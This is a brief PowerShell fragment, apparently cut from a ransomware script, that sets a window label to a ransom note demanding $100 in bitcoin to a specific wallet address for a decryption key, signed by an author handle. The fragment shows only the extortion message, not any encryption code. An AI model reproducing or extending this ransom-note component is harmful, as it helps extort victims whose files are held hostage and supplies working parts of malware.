...
$label2.Text = " To recover your files you will need the Decryption Key `n`n`n Send 100$ BTC : bc1qhr946kn4hpp0evvyntan43lrd973llnwqhquer `n`n`n You can close this window when Decryption is complete `n`n`n Written by Okaidi86"
